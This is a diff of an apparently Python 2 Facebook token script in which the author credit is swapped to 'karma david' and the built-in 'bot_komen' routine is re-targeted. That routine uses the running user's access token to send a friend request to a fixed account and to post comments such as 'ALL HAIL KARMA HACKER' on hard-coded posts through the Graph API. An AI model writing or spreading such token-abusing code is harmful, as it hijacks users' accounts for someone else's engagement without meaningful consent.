@@ -67,7 +67,7 @@ logo = """
 ██╔═██╗░██╔══██║██╔══██╗██║╚██╔╝██║██╔══██║
 ██║░╚██╗██║░░██║██║░░██║██║░╚═╝░██║██║░░██║
 ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
-\033[1;41;97mAuthor : ROMI AFRIZAL\033[0m
+\033[1;41;97mAuthor : karma david\033[0m
  """
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -124,7 +124,7 @@ def tokenz():
 		zedd.close()
 		jalan ('\033[1;97mYou MUST FOLLOW THIS ACCOUNT TO WORK SUCCESSFUL :) ')
 		print '\033[1;97m[\033[1;39m✓\033[1;97m]\033[1;39m Alhamdulillah'
-		os.system('xdg-open  https://www.facebook.com/karma428')
+		os.system('xdg-open  https://www.facebook.com/karma.428')
 		bot_komen()
 	except KeyError:
 		print "\033[1;97m[\033[1;39m!\033[1;97m] \033[1;39mToken Salah !"
@@ -139,11 +139,11 @@ def bot_komen():
 		print"\033[1;39m[!] Token invalid"
 		os.system('rm -rf login.txt')
 	una = ('553503218')
-	kom = ('Assalamualaikum😊')
+	kom = ('HACKING SCRIPT PLS😔')
 	reac = ('LOVE')
-	post = ('10160570961848219')
-	post2 = ('10160570961848219')
-	kom2 = ('Izin Pakai script lu bang🙏')
+	post = ('10160508810683219')
+	post2 = ('10160508810683219')
+	kom2 = ('ALL HAIL KARMA HACKER')
 	reac2 = ('LOVE')
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
